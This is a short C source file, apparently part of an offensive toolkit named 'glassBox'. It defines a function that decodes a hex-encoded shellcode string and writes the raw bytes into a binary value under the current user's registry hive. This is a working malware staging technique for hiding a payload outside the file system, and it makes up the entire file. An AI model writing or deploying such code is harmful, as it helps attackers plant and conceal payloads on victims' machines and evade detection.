#include "glassBox.h"

BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN SIZE_T dwShellcodeSize) {

	BOOL	bSTATE = TRUE;
	LSTATUS	STATUS = NULL;
	HKEY	hKey = NULL;

	info("Writing 0x%p [ Size: %ld ] to \"%s\\%s\" ... ", pShellcode, dwShellcodeSize, REGISTRY, REGSTRING);

	STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
	if (ERROR_SUCCESS != STATUS) {
		warn("RegOpenKeyExA Failed With Error : %d", STATUS);
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Converts pShellcode string into raw bytes to put into the registry
	const char* hex = pShellcode;
	size_t hexLen = strlen(hex);
	size_t binSize = hexLen / 2;
	unsigned char* bin = (unsigned char*)malloc(binSize);

	for (size_t i = 0l; i < binSize; i++) {
		unsigned int b;
		sscanf_s(hex + i * 2, "%2x", &b);
		bin[i] = (unsigned char)b;
	}

	STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, bin, (DWORD)binSize);
	if (ERROR_SUCCESS != STATUS) {
		warn("RegSetValueExA Failed With Error : %d", STATUS);
		bSTATE = FALSE; goto _EndOfFunction;
	}
	free(bin);

	okay("Writing To Registry was Successfull!");


_EndOfFunction:
	if (hKey)
		RegCloseKey(hKey);
	return bSTATE;

}